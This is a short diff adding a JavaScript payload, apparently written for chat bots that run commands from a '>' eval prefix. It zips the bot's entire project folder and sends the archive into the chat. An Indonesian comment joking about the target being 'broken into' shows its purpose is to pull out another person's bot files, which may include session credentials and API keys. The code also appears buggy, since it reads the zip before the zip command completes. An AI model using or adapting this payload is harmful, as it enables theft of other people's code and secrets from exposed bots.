@@ -1,0 +1,18 @@
+> let fs = require("fs")
+let cp, { exec } = require('child_process')
+let { promisify } = require("util")
+let exec_ = promisify(exec).bind(cp);
+//Jangan marah klo kejebol bg
+(async() => {
+try {
+  let zipCommand = `zip -r BackupScript.zip * -x "node_modules/*"`;
+  exec_(zipCommand, (err, stdout) => {
+  })
+  const file = await fs.readFileSync('./BackupScript.zip')
+  await this.sendFile(m.chat, 'BackupScript.zip')
+  await fs.unlinkSync('./BackupScript.zip')
+return true
+} catch (e) {
+  return e
+}
+})()
